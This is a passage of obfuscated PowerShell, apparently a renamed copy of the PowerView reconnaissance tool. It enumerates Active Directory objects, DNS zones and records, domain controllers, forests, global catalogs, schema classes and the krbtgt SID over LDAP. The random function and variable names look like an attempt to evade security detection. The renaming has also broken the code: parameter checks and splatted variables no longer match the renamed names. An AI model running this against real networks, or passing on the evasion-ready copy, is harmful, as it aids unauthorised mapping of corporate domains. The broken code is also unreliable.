            if (($_ -eq 'objectsid') -or ($_ -eq 'sidhistory')) {
                $jwtVZAQh99[$_] = $IzcJvFdA99[$_] | ForEach-Object { (New-Object System.Security.Principal.SecurityIdentifier($_, 0)).Value }
            }
            elseif ($_ -eq 'grouptype') {
                $jwtVZAQh99[$_] = $IzcJvFdA99[$_][0] -as $pVLuwBtV99
            }
            elseif ($_ -eq 'samaccounttype') {
                $jwtVZAQh99[$_] = $IzcJvFdA99[$_][0] -as $KyRsTklh99
            }
            elseif ($_ -eq 'objectguid') {
                $jwtVZAQh99[$_] = (New-Object Guid (,$IzcJvFdA99[$_][0])).Guid
            }
            elseif ($_ -eq 'useraccountcontrol') {
                $jwtVZAQh99[$_] = $IzcJvFdA99[$_][0] -as $lzMGacfo99
            }
            elseif ($_ -eq 'ntsecuritydescriptor') {
                $nhvSnUDf99 = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $IzcJvFdA99[$_][0], 0
                if ($nhvSnUDf99.Owner) {
                    $jwtVZAQh99['Owner'] = $nhvSnUDf99.Owner
                }
                if ($nhvSnUDf99.Group) {
                    $jwtVZAQh99['Group'] = $nhvSnUDf99.Group
                }
                if ($nhvSnUDf99.DiscretionaryAcl) {
                    $jwtVZAQh99['DiscretionaryAcl'] = $nhvSnUDf99.DiscretionaryAcl
                }
                if ($nhvSnUDf99.SystemAcl) {
                    $jwtVZAQh99['SystemAcl'] = $nhvSnUDf99.SystemAcl
                }
            }
            elseif ($_ -eq 'accountexpires') {
                if ($IzcJvFdA99[$_][0] -gt [DateTime]::MaxValue.Ticks) {
                    $jwtVZAQh99[$_] = "NEVER"
                }
                else {
                    $jwtVZAQh99[$_] = [datetime]::fromfiletime($IzcJvFdA99[$_][0])
                }
            }
            elseif ( ($_ -eq 'lastlogon') -or ($_ -eq 'lastlogontimestamp') -or ($_ -eq 'pwdlastset') -or ($_ -eq 'lastlogoff') -or ($_ -eq 'badPasswordTime') ) {
                if ($IzcJvFdA99[$_][0] -is [System.MarshalByRefObject]) {
                    $Temp = $IzcJvFdA99[$_][0]
                    [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    $jwtVZAQh99[$_] = ([datetime]::FromFileTime([Int64]("0x{0:x8}{1:x8}" -f $High, $Low)))
                }
                else {
                    $jwtVZAQh99[$_] = ([datetime]::FromFileTime(($IzcJvFdA99[$_][0])))
                }
            }
            elseif ($IzcJvFdA99[$_][0] -is [System.MarshalByRefObject]) {
                $Prop = $IzcJvFdA99[$_]
                try {
                    $Temp = $Prop[$_][0]
                    [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    $jwtVZAQh99[$_] = [Int64]("0x{0:x8}{1:x8}" -f $High, $Low)
                }
                catch {
                    Write-Verbose "[gelling] error: $_"
                    $jwtVZAQh99[$_] = $Prop[$_]
                }
            }
            elseif ($IzcJvFdA99[$_].count -eq 1) {
                $jwtVZAQh99[$_] = $IzcJvFdA99[$_][0]
            }
            else {
                $jwtVZAQh99[$_] = $IzcJvFdA99[$_]
            }
        }
    }
    try {
        New-Object -TypeName PSObject -Property $jwtVZAQh99
    }
    catch {
        Write-Warning "[gelling] Error parsing LDAP properties : $_"
    }
}
function squintest {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.DirectorySearcher')]
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $CmuysoGL99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $aWyQQagT99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $IzcJvFdA99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $BffxXlHt99,
        [ValidateNotNullOrEmpty()]
        [String]
        $blbfhEAU99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vbyFupaI99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $RVZhWaEH99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $rguZwVJP99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $CRJCwXfg99 = 120,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $lGQMWbBj99,
        [Switch]
        $iqiYBoee99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $cELjQvSA99 = $CmuysoGL99
            if ($ENV:USERDNSDOMAIN -and ($ENV:USERDNSDOMAIN.Trim() -ne '')) {
                $wvZHbMee99 = $ENV:USERDNSDOMAIN
                if ($ENV:LOGONSERVER -and ($ENV:LOGONSERVER.Trim() -ne '') -and $wvZHbMee99) {
                    $HWXPnuyk99 = "$($ENV:LOGONSERVER -replace '\\','').$wvZHbMee99"
                }
            }
        }
        elseif ($PSBoundParameters['Credential']) {
            $FVHXYbcD99 = rompers -QWHERWHL99 $QWHERWHL99
            $HWXPnuyk99 = ($FVHXYbcD99.PdcRoleOwner).Name
            $cELjQvSA99 = $FVHXYbcD99.Name
        }
        elseif ($ENV:USERDNSDOMAIN -and ($ENV:USERDNSDOMAIN.Trim() -ne '')) {
            $cELjQvSA99 = $ENV:USERDNSDOMAIN
            if ($ENV:LOGONSERVER -and ($ENV:LOGONSERVER.Trim() -ne '') -and $cELjQvSA99) {
                $HWXPnuyk99 = "$($ENV:LOGONSERVER -replace '\\','').$cELjQvSA99"
            }
        }
        else {
            write-verbose "get-domain"
            $FVHXYbcD99 = rompers
            $HWXPnuyk99 = ($FVHXYbcD99.PdcRoleOwner).Name
            $cELjQvSA99 = $FVHXYbcD99.Name
        }
        if ($PSBoundParameters['Server']) {
            $HWXPnuyk99 = $vbyFupaI99
        }
        $HqWenaeM99 = 'LDAP://'
        if ($HWXPnuyk99 -and ($HWXPnuyk99.Trim() -ne '')) {
            $HqWenaeM99 += $HWXPnuyk99
            if ($cELjQvSA99) {
                $HqWenaeM99 += '/'
            }
        }
        if ($PSBoundParameters['SearchBasePrefix']) {
            $HqWenaeM99 += $blbfhEAU99 + ','
        }
        if ($PSBoundParameters['SearchBase']) {
            if ($BffxXlHt99 -Match '^GC://') {
                $DN = $BffxXlHt99.ToUpper().Trim('/')
                $HqWenaeM99 = ''
            }
            else {
                if ($BffxXlHt99 -match '^LDAP://') {
                    if ($BffxXlHt99 -match "LDAP://.+/.+") {
                        $HqWenaeM99 = ''
                        $DN = $BffxXlHt99
                    }
                    else {
                        $DN = $BffxXlHt99.SubString(7)
                    }
                }
                else {
                    $DN = $BffxXlHt99
                }
            }
        }
        else {
            if ($cELjQvSA99 -and ($cELjQvSA99.Trim() -ne '')) {
                $DN = "DC=$($cELjQvSA99.Replace('.', ',DC='))"
            }
        }
        $HqWenaeM99 += $DN
        Write-Verbose "[squintest] search base: $HqWenaeM99"
        if ($QWHERWHL99 -ne [Management.Automation.PSCredential]::Empty) {
            Write-Verbose "[squintest] Using alternate credentials for LDAP connection"
            $FVHXYbcD99 = New-Object DirectoryServices.DirectoryEntry($HqWenaeM99, $QWHERWHL99.UserName, $QWHERWHL99.GetNetworkCredential().Password)
            $oSFVEugC99 = New-Object System.DirectoryServices.DirectorySearcher($FVHXYbcD99)
        }
        else {
            $oSFVEugC99 = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$HqWenaeM99)
        }
        $oSFVEugC99.PageSize = $rguZwVJP99
        $oSFVEugC99.SearchScope = $RVZhWaEH99
        $oSFVEugC99.CacheResults = $False
        $oSFVEugC99.ReferralChasing = [System.DirectoryServices.ReferralChasingOption]::All
        if ($PSBoundParameters['ServerTimeLimit']) {
            $oSFVEugC99.ServerTimeLimit = $CRJCwXfg99
        }
        if ($PSBoundParameters['Tombstone']) {
            $oSFVEugC99.Tombstone = $True
        }
        if ($PSBoundParameters['LDAPFilter']) {
            $oSFVEugC99.filter = $aWyQQagT99
        }
        if ($PSBoundParameters['SecurityMasks']) {
            $oSFVEugC99.SecurityMasks = Switch ($lGQMWbBj99) {
                'Dacl' { [System.DirectoryServices.SecurityMasks]::Dacl }
                'Group' { [System.DirectoryServices.SecurityMasks]::Group }
                'None' { [System.DirectoryServices.SecurityMasks]::None }
                'Owner' { [System.DirectoryServices.SecurityMasks]::Owner }
                'Sacl' { [System.DirectoryServices.SecurityMasks]::Sacl }
            }
        }
        if ($PSBoundParameters['Properties']) {
            $jIqidXAW99 = $IzcJvFdA99| ForEach-Object { $_.Split(',') }
            $Null = $oSFVEugC99.PropertiesToLoad.AddRange(($jIqidXAW99))
        }
        $oSFVEugC99
    }
}
function twirled {
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [Byte[]]
        $MDtlYCaA99
    )
    BEGIN {
        function rifts {
            [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseOutputTypeCorrectly', '')]
            [CmdletBinding()]
            Param(
                [Byte[]]
                $Raw
            )
            [Int]$GPZKfjnt99 = $Raw[0]
            [Int]$jNaOSxTh99 = $Raw[1]
            [Int]$Index =  2
            [String]$Name  = ''
            while ($jNaOSxTh99-- -gt 0)
            {
                [Int]$GqeJEHST99 = $Raw[$Index++]
                while ($GqeJEHST99-- -gt 0) {
                    $Name += [Char]$Raw[$Index++]
                }
                $Name += "."
            }
            $Name
        }
    }
    PROCESS {
        $CKHbHIMC99 = [BitConverter]::ToUInt16($MDtlYCaA99, 2)
        $gtTMEBID99 = [BitConverter]::ToUInt32($MDtlYCaA99, 8)
        $cASDsBrd99 = $MDtlYCaA99[12..15]
        $Null = [array]::Reverse($cASDsBrd99)
        $TTL = [BitConverter]::ToUInt32($cASDsBrd99, 0)
        $Age = [BitConverter]::ToUInt32($MDtlYCaA99, 20)
        if ($Age -ne 0) {
            $dYsyWanH99 = ((Get-Date -Year 1601 -Month 1 -Day 1 -Hour 0 -Minute 0 -Second 0).AddHours($age)).ToString()
        }
        else {
            $dYsyWanH99 = '[static]'
        }
        $FHPGsuLx99 = New-Object PSObject
        if ($CKHbHIMC99 -eq 1) {
            $IP = "{0}.{1}.{2}.{3}" -f $MDtlYCaA99[24], $MDtlYCaA99[25], $MDtlYCaA99[26], $MDtlYCaA99[27]
            $Data = $IP
            $FHPGsuLx99 | Add-Member Noteproperty 'RecordType' 'A'
        }
        elseif ($CKHbHIMC99 -eq 2) {
            $oHyVuLxP99 = rifts $MDtlYCaA99[24..$MDtlYCaA99.length]
            $Data = $oHyVuLxP99
            $FHPGsuLx99 | Add-Member Noteproperty 'RecordType' 'NS'
        }
        elseif ($CKHbHIMC99 -eq 5) {
            $Alias = rifts $MDtlYCaA99[24..$MDtlYCaA99.length]
            $Data = $Alias
            $FHPGsuLx99 | Add-Member Noteproperty 'RecordType' 'CNAME'
        }
        elseif ($CKHbHIMC99 -eq 6) {
            $Data = $([System.Convert]::ToBase64String($MDtlYCaA99[24..$MDtlYCaA99.length]))
            $FHPGsuLx99 | Add-Member Noteproperty 'RecordType' 'SOA'
        }
        elseif ($CKHbHIMC99 -eq 12) {
            $Ptr = rifts $MDtlYCaA99[24..$MDtlYCaA99.length]
            $Data = $Ptr
            $FHPGsuLx99 | Add-Member Noteproperty 'RecordType' 'PTR'
        }
        elseif ($CKHbHIMC99 -eq 13) {
            $Data = $([System.Convert]::ToBase64String($MDtlYCaA99[24..$MDtlYCaA99.length]))
            $FHPGsuLx99 | Add-Member Noteproperty 'RecordType' 'HINFO'
        }
        elseif ($CKHbHIMC99 -eq 15) {
            $Data = $([System.Convert]::ToBase64String($MDtlYCaA99[24..$MDtlYCaA99.length]))
            $FHPGsuLx99 | Add-Member Noteproperty 'RecordType' 'MX'
        }
        elseif ($CKHbHIMC99 -eq 16) {
            [string]$TXT  = ''
            [int]$GqeJEHST99 = $MDtlYCaA99[24]
            $Index = 25
            while ($GqeJEHST99-- -gt 0) {
                $TXT += [char]$MDtlYCaA99[$index++]
            }
            $Data = $TXT
            $FHPGsuLx99 | Add-Member Noteproperty 'RecordType' 'TXT'
        }
        elseif ($CKHbHIMC99 -eq 28) {
            $Data = $([System.Convert]::ToBase64String($MDtlYCaA99[24..$MDtlYCaA99.length]))
            $FHPGsuLx99 | Add-Member Noteproperty 'RecordType' 'AAAA'
        }
        elseif ($CKHbHIMC99 -eq 33) {
            $Data = $([System.Convert]::ToBase64String($MDtlYCaA99[24..$MDtlYCaA99.length]))
            $FHPGsuLx99 | Add-Member Noteproperty 'RecordType' 'SRV'
        }
        else {
            $Data = $([System.Convert]::ToBase64String($MDtlYCaA99[24..$MDtlYCaA99.length]))
            $FHPGsuLx99 | Add-Member Noteproperty 'RecordType' 'UNKNOWN'
        }
        $FHPGsuLx99 | Add-Member Noteproperty 'UpdatedAtSerial' $gtTMEBID99
        $FHPGsuLx99 | Add-Member Noteproperty 'TTL' $TTL
        $FHPGsuLx99 | Add-Member Noteproperty 'Age' $Age
        $FHPGsuLx99 | Add-Member Noteproperty 'TimeStamp' $dYsyWanH99
        $FHPGsuLx99 | Add-Member Noteproperty 'Data' $Data
        $FHPGsuLx99
    }
}
function monarchic {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DNSZone')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $CmuysoGL99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vbyFupaI99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $IzcJvFdA99,
        [ValidateRange(1, 10000)]
        [Int]
        $rguZwVJP99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $CRJCwXfg99,
        [Alias('ReturnOne')]
        [Switch]
        $kCjMYGtw99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        $qbMTjYnI99 = @{
            'LDAPFilter' = '(objectClass=dnsZone)'
        }
        if ($PSBoundParameters['Domain']) { $qbMTjYnI99['Domain'] = $CmuysoGL99 }
        if ($PSBoundParameters['Server']) { $qbMTjYnI99['Server'] = $vbyFupaI99 }
        if ($PSBoundParameters['Properties']) { $qbMTjYnI99['Properties'] = $IzcJvFdA99 }
        if ($PSBoundParameters['ResultPageSize']) { $qbMTjYnI99['ResultPageSize'] = $rguZwVJP99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $qbMTjYnI99['ServerTimeLimit'] = $CRJCwXfg99 }
        if ($PSBoundParameters['Credential']) { $qbMTjYnI99['Credential'] = $QWHERWHL99 }
        $hCmvHSMD99 = squintest @SearcherArguments
        if ($hCmvHSMD99) {
            if ($PSBoundParameters['FindOne']) { $IUnNdChl99 = $hCmvHSMD99.FindOne()  }
            else { $IUnNdChl99 = $hCmvHSMD99.FindAll() }
            $IUnNdChl99 | Where-Object {$_} | ForEach-Object {
                $Out = gelling -IzcJvFdA99 $_.Properties
                $Out | Add-Member NoteProperty 'ZoneName' $Out.name
                $Out.PSObject.TypeNames.Insert(0, 'PowerView.DNSZone')
                $Out
            }
            if ($IUnNdChl99) {
                try { $IUnNdChl99.dispose() }
                catch {
                    Write-Verbose "[duns] Error disposing of the Results object: $_"
                }
            }
            $hCmvHSMD99.dispose()
        }
        $qbMTjYnI99['SearchBasePrefix'] = 'CN=MicrosoftDNS,DC=DomainDnsZones'
        $AxOXjpHv99 = squintest @SearcherArguments
        if ($AxOXjpHv99) {
            try {
                if ($PSBoundParameters['FindOne']) { $IUnNdChl99 = $AxOXjpHv99.FindOne() }
                else { $IUnNdChl99 = $AxOXjpHv99.FindAll() }
                $IUnNdChl99 | Where-Object {$_} | ForEach-Object {
                    $Out = gelling -IzcJvFdA99 $_.Properties
                    $Out | Add-Member NoteProperty 'ZoneName' $Out.name
                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.DNSZone')
                    $Out
                }
                if ($IUnNdChl99) {
                    try { $IUnNdChl99.dispose() }
                    catch {
                        Write-Verbose "[monarchic] Error disposing of the Results object: $_"
                    }
                }
            }
            catch {
                Write-Verbose "[monarchic] Error accessing 'CN=MicrosoftDNS,DC=DomainDnsZones'"
            }
            $AxOXjpHv99.dispose()
        }
    }
}
function billfold {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DNSRecord')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0,  Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $jTfTMXwq99,
        [ValidateNotNullOrEmpty()]
        [String]
        $CmuysoGL99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vbyFupaI99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $IzcJvFdA99 = 'name,distinguishedname,dnsrecord,whencreated,whenchanged',
        [ValidateRange(1, 10000)]
        [Int]
        $rguZwVJP99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $CRJCwXfg99,
        [Alias('ReturnOne')]
        [Switch]
        $kCjMYGtw99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        $qbMTjYnI99 = @{
            'LDAPFilter' = '(objectClass=dnsNode)'
            'SearchBasePrefix' = "DC=$($jTfTMXwq99),CN=MicrosoftDNS,DC=DomainDnsZones"
        }
        if ($PSBoundParameters['Domain']) { $qbMTjYnI99['Domain'] = $CmuysoGL99 }
        if ($PSBoundParameters['Server']) { $qbMTjYnI99['Server'] = $vbyFupaI99 }
        if ($PSBoundParameters['Properties']) { $qbMTjYnI99['Properties'] = $IzcJvFdA99 }
        if ($PSBoundParameters['ResultPageSize']) { $qbMTjYnI99['ResultPageSize'] = $rguZwVJP99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $qbMTjYnI99['ServerTimeLimit'] = $CRJCwXfg99 }
        if ($PSBoundParameters['Credential']) { $qbMTjYnI99['Credential'] = $QWHERWHL99 }
        $FWydwJWu99 = squintest @SearcherArguments
        if ($FWydwJWu99) {
            if ($PSBoundParameters['FindOne']) { $IUnNdChl99 = $FWydwJWu99.FindOne() }
            else { $IUnNdChl99 = $FWydwJWu99.FindAll() }
            $IUnNdChl99 | Where-Object {$_} | ForEach-Object {
                try {
                    $Out = gelling -IzcJvFdA99 $_.Properties | Select-Object name,distinguishedname,dnsrecord,whencreated,whenchanged
                    $Out | Add-Member NoteProperty 'ZoneName' $jTfTMXwq99
                    if ($Out.dnsrecord -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                        $BjLOJCJS99 = twirled -MDtlYCaA99 $Out.dnsrecord[0]
                    }
                    else {
                        $BjLOJCJS99 = twirled -MDtlYCaA99 $Out.dnsrecord
                    }
                    if ($BjLOJCJS99) {
                        $BjLOJCJS99.PSObject.Properties | ForEach-Object {
                            $Out | Add-Member NoteProperty $_.Name $_.Value
                        }
                    }
                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.DNSRecord')
                    $Out
                }
                catch {
                    Write-Warning "[billfold] Error: $_"
                    $Out
                }
            }
            if ($IUnNdChl99) {
                try { $IUnNdChl99.dispose() }
                catch {
                    Write-Verbose "[billfold] Error disposing of the Results object: $_"
                }
            }
            $FWydwJWu99.dispose()
        }
    }
}
function rompers {
    [OutputType([System.DirectoryServices.ActiveDirectory.Domain])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $CmuysoGL99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        if ($PSBoundParameters['Credential']) {
            Write-Verbose '[rompers] Using alternate credentials for rompers'
            if ($PSBoundParameters['Domain']) {
                $cELjQvSA99 = $CmuysoGL99
            }
            else {
                $cELjQvSA99 = $QWHERWHL99.GetNetworkCredential().Domain
                Write-Verbose "[rompers] Extracted domain '$cELjQvSA99' from -QWHERWHL99"
            }
            $uGJsvFce99 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $cELjQvSA99, $QWHERWHL99.UserName, $QWHERWHL99.GetNetworkCredential().Password)
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($uGJsvFce99)
            }
            catch {
                Write-Verbose "[rompers] The specified domain '$cELjQvSA99' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid: $_"
            }
        }
        elseif ($PSBoundParameters['Domain']) {
            $uGJsvFce99 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $CmuysoGL99)
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($uGJsvFce99)
            }
            catch {
                Write-Verbose "[rompers] The specified domain '$CmuysoGL99' does not exist, could not be contacted, or there isn't an existing trust : $_"
            }
        }
        else {
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            }
            catch {
                Write-Verbose "[rompers] Error retrieving the current domain: $_"
            }
        }
    }
}
function Marsala {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Computer')]
    [OutputType('System.DirectoryServices.ActiveDirectory.DomainController')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [String]
        $CmuysoGL99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vbyFupaI99,
        [Switch]
        $LDAP,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        $tgsMUIUu99 = @{}
        if ($PSBoundParameters['Domain']) { $tgsMUIUu99['Domain'] = $CmuysoGL99 }
        if ($PSBoundParameters['Credential']) { $tgsMUIUu99['Credential'] = $QWHERWHL99 }
        if ($PSBoundParameters['LDAP'] -or $PSBoundParameters['Server']) {
            if ($PSBoundParameters['Server']) { $tgsMUIUu99['Server'] = $vbyFupaI99 }
            $tgsMUIUu99['LDAPFilter'] = '(userAccountControl:1.2.840.113556.1.4.803:=8192)'
            beefsteaks @Arguments
        }
        else {
            $zLMvNifd99 = rompers @Arguments
            if ($zLMvNifd99) {
                $zLMvNifd99.DomainControllers
            }
        }
    }
}
function hangovers {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FoBFxbKO99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        if ($PSBoundParameters['Credential']) {
            Write-Verbose "[hangovers] Using alternate credentials for hangovers"
            if ($PSBoundParameters['Forest']) {
                $TWjyaYzC99 = $FoBFxbKO99
            }
            else {
                $TWjyaYzC99 = $QWHERWHL99.GetNetworkCredential().Domain
                Write-Verbose "[hangovers] Extracted domain '$FoBFxbKO99' from -QWHERWHL99"
            }
            $TTEtbTnL99 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $TWjyaYzC99, $QWHERWHL99.UserName, $QWHERWHL99.GetNetworkCredential().Password)
            try {
                $BAYpMjNI99 = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($TTEtbTnL99)
            }
            catch {
                Write-Verbose "[hangovers] The specified forest '$TWjyaYzC99' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid: $_"
                $Null
            }
        }
        elseif ($PSBoundParameters['Forest']) {
            $TTEtbTnL99 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $FoBFxbKO99)
            try {
                $BAYpMjNI99 = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($TTEtbTnL99)
            }
            catch {
                Write-Verbose "[hangovers] The specified forest '$FoBFxbKO99' does not exist, could not be contacted, or there isn't an existing trust: $_"
                return $Null
            }
        }
        else {
            $BAYpMjNI99 = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
        }
        if ($BAYpMjNI99) {
            if ($PSBoundParameters['Credential']) {
                $wqLStMBd99 = (melodrama -NADQIykH99 "krbtgt" -CmuysoGL99 $BAYpMjNI99.RootDomain.Name -QWHERWHL99 $QWHERWHL99).objectsid
            }
            else {
                $wqLStMBd99 = (melodrama -NADQIykH99 "krbtgt" -CmuysoGL99 $BAYpMjNI99.RootDomain.Name).objectsid
            }
            $Parts = $wqLStMBd99 -Split '-'
            $wqLStMBd99 = $Parts[0..$($Parts.length-2)] -join '-'
            $BAYpMjNI99 | Add-Member NoteProperty 'RootDomainSid' $wqLStMBd99
            $BAYpMjNI99
        }
    }
}
function trusting {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.ActiveDirectory.Domain')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FoBFxbKO99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        $tgsMUIUu99 = @{}
        if ($PSBoundParameters['Forest']) { $tgsMUIUu99['Forest'] = $FoBFxbKO99 }
        if ($PSBoundParameters['Credential']) { $tgsMUIUu99['Credential'] = $QWHERWHL99 }
        $BAYpMjNI99 = hangovers @Arguments
        if ($BAYpMjNI99) {
            $BAYpMjNI99.Domains
        }
    }
}
function junketed {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.ActiveDirectory.GlobalCatalog')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FoBFxbKO99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        $tgsMUIUu99 = @{}
        if ($PSBoundParameters['Forest']) { $tgsMUIUu99['Forest'] = $FoBFxbKO99 }
        if ($PSBoundParameters['Credential']) { $tgsMUIUu99['Credential'] = $QWHERWHL99 }
        $BAYpMjNI99 = hangovers @Arguments
        if ($BAYpMjNI99) {
            $BAYpMjNI99.FindAllGlobalCatalogs()
        }
    }
}
function pushes {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([System.DirectoryServices.ActiveDirectory.ActiveDirectorySchemaClass])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [Alias('Class')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $XFGfFgnK99,
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $FoBFxbKO99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        $tgsMUIUu99 = @{}
        if ($PSBoundParameters['Forest']) { $tgsMUIUu99['Forest'] = $FoBFxbKO99 }
        if ($PSBoundParameters['Credential']) { $tgsMUIUu99['Credential'] = $QWHERWHL99 }
        $BAYpMjNI99 = hangovers @Arguments
        if ($BAYpMjNI99) {
            if ($PSBoundParameters['ClassName']) {
                ForEach ($DDRaGLIM99 in $XFGfFgnK99) {
                    $BAYpMjNI99.Schema.FindClass($DDRaGLIM99)
                }
            }
            else {
                $BAYpMjNI99.Schema.FindAllClasses()
            }
        }
    }
}
function poseur {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.PropertyOutlier')]
    [CmdletBinding(DefaultParameterSetName = 'ClassName')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 'ClassName')]
        [Alias('Class')]
        [ValidateSet('User', 'Group', 'Computer')]
        [String]
        $XFGfFgnK99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ChOeCDyK99,
        [Parameter(ValueFromPipeline = $True, Mandatory = $True, ParameterSetName = 'ReferenceObject')]
        [PSCustomObject]
        $kPdfPxXl99,
        [ValidateNotNullOrEmpty()]
        [String]
        $CmuysoGL99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $aWyQQagT99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $BffxXlHt99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vbyFupaI99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $RVZhWaEH99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $rguZwVJP99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $CRJCwXfg99,
        [Switch]
        $iqiYBoee99,
        [Management.Automation.PSCredential]
